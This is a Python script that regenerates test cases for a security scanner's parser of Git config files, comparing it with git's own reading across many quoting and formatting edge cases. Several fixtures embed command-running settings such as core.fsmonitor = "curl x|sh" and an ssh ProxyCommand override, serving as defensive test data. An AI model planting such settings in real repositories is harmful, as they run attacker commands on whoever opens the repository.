#!/usr/bin/env python3
# Regenerates tests/gitconfig-cases.json: Git config texts with the variables git reads from them (git config -f FILE -z
#   --list, run here only, on these fixed texts) and the records of ZES_GITCFG_AWK (zes-scan.sh) for the same text.
#   For every text git accepts, the two must be the same list (this script fails otherwise); for a text git rejects
#   ("bad config line"), "git" is null and "vars" is what ZES reads (it skips to the next line and goes on, so it never
#   reports less than git reads). tests/run-tests.sh checks the awk parser and ui/tests/unit/r6.test.ts the UI port
#   (gitConfigVars) against "vars". Usage: python3 -I tests/gen-gitconfig-cases.py [--check]   (needs bash, awk; git
#   to regenerate; --check compares the awk records with the stored file, and with git when git is there)
import json, os, re, subprocess, sys, tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
SCAN = os.path.join(os.path.dirname(HERE), "zes-scan.sh")
CASES = [
    ("header-line key", '[core] fsmonitor = "curl x|sh"\n[core]sshCommand = ssh -oProxyCommand=x\n'),
    ("last value wins in git, every one counts in ZES", '[core]\n\tfsmonitor = false\n\tfsmonitor = "curl x|sh"\n'),
    ("case of section and key", '[CoRe]\n\tFsMonitor = x\n\tHOOKSPATH = h\n'),
    ("two headers on one line", '[a][core] fsmonitor = x\n'),
    ("subsections", '[remote "Origin"]\n\turl = u\n[Remote.Origin]\n\turl = v\n[a "b\\"c\\\\d"]\n\tk = 1\n'),
    ("quotes, escapes, comments", '[core]\n\tk = "a # b" c ; d\n\tl = x\\ty\\nz\\\\w\\"q\n\tm = "  spaced  "\n'),
    ("continuation", '[core]\n\tfsmonitor = curl \\\n  x|sh\n\tk = "a\\\n b"\n'),
    ("continuation then comment", '[core]\n\tfsmonitor = touch ran\\\n; false\n'),
    ("whitespace inside a value", '[core]\n\tk = a  \t b\t\n'),
    ("CR LF", '[core]\r\n\tfsmonitor = x\r\n\tk = y\r\n'),
    ("lone CR is whitespace", '[core]\n\tbare = false\rfsmonitor = "curl x|sh"\n'),
    ("U+2028 is a character", '[core]\n\tbare = false fsmonitor = "curl x|sh"\n'),
    ("VT and FF are no whitespace for git", '[core]\n\tk = \x0ba\x0c\n'),
    ("BOM", '﻿[core]\n\tfsmonitor = x\n'),
    ("key without value, empty value", '[core]\n\tfsmonitor\n\tk =\n\tl = ""\n'),
    ("include on the header line", '[include] path = x.cfg\n[includeIf "gitdir:/a/"]path = y.cfg\n'),
    ("no section", 'k = v\n[core]\n'),
    ("bad line in the middle", '[core]\n\tk = 1\n\t!bad\n\tfsmonitor = x\n'),
    ("bad escape", '[core]\n\tfsmonitor = a\\xb\n'),
    ("unterminated quote", '[core]\n\tfsmonitor = "a\n\tk = 1\n'),
    ("bad header", '[core x]\n\tk = 1\n[]\n\tl = 2\n'),
    ("NUL in a value", '[core]\n\tk = a\x00b\n'),
    ("comment lines", '# [core]\n; fsmonitor = x\n[core] ; c\n\t# fsmonitor = y\n'),
    ("value at EOF without newline", '[core]\n\tfsmonitor = x'),
    ("continuation at EOF", '[core]\n\tfsmonitor = x\\'),
]

def awk_vars(path):
    lib = subprocess.run(["sed", "-n", "/^ZES_AWK_LIB=/,/^'$/p; /^ZES_GITCFG_AWK=/,/^'$/p", SCAN], capture_output=True, text=True, check=True).stdout
    out = subprocess.run(["bash", "-c", lib + '\nawk "$ZES_AWK_LIB$ZES_GITCFG_AWK" "$1"', "_", path], capture_output=True, check=True,
                         env={**os.environ, "LC_ALL": "C"}).stdout
    def dec(b):
        return re.sub(rb"\\(.)", lambda m: {b"n": b"\n", b"u": b"\x1f"}.get(m.group(1), m.group(1)), b)
    res = []
    for line in out.split(b"\n")[:-1]:
        f = line.split(b"\x1f")
        res.append([int(f[0]), f[1].decode(), dec(f[2]).decode("utf-8", "surrogateescape"), f[3].decode(),
                    dec(f[5]).decode("utf-8", "surrogateescape") if f[4] == b"1" else None])
    return res

def git_vars(path):
    g = subprocess.run(["git", "config", "-f", path, "-z", "--list"], capture_output=True,
                       env={**os.environ, "GIT_CONFIG_NOSYSTEM": "1", "HOME": "/nonexistent", "LC_ALL": "C"})
    if g.returncode != 0:
        return None
    res = []
    for e in g.stdout.split(b"\0")[:-1]:
        n, v = (e.split(b"\n", 1) + [None])[:2] if b"\n" in e else (e, None)
        res.append([n.decode("utf-8", "surrogateescape"), None if v is None else v.decode("utf-8", "surrogateescape")])
    return res

CHECK = "--check" in sys.argv[1:]
HAVE_GIT = subprocess.run(["sh", "-c", "command -v git"], capture_output=True).returncode == 0
if CHECK:
    stored = json.load(open(os.path.join(HERE, "gitconfig-cases.json"), encoding="utf-8"))["cases"]
    bad = []
    with tempfile.TemporaryDirectory() as d:
        p = os.path.join(d, "config")
        for c in stored:
            open(p, "wb").write(bytes.fromhex(c["hex"]))
            if awk_vars(p) != c["vars"]:
                bad.append(c["name"])
            if HAVE_GIT and git_vars(p) != c["git"]:
                bad.append(c["name"] + " (git)")
    if len(stored) != len(CASES) or bad:
        sys.exit(f"differs: {bad} ({len(stored)} stored, {len(CASES)} cases)")
    print(f"{len(stored)} cases ok")
    sys.exit(0)
if not HAVE_GIT:
    sys.exit("git is needed to regenerate")
out = []
with tempfile.TemporaryDirectory() as d:
    p = os.path.join(d, "config")
    for name, text in CASES:
        data = text.encode("utf-8")
        open(p, "wb").write(data)
        z, g = awk_vars(p), git_vars(p)
        if g is not None:
            # git prints section.subsection.key (C strings: a value ends at a NUL)
            mine = [[(f"{s}." + (f"{ss}." if ss else "") if s else "") + k, None if v is None else v.split("\0")[0]] for _, s, ss, k, v in z]
            if mine != g:
                sys.exit(f"{name}: ZES {mine} != git {g}")
        out.append({"name": name, "hex": data.hex(), "git": g, "vars": z})
json.dump({"comment": "generated by tests/gen-gitconfig-cases.py: [line, section, subsection, key, value or null]; git is git config --list (null: git rejects the text)", "cases": out},
          open(os.path.join(HERE, "gitconfig-cases.json"), "w", encoding="utf-8"), ensure_ascii=False, indent=1)
print(f"{len(out)} cases, git accepts {sum(c['git'] is not None for c in out)}")
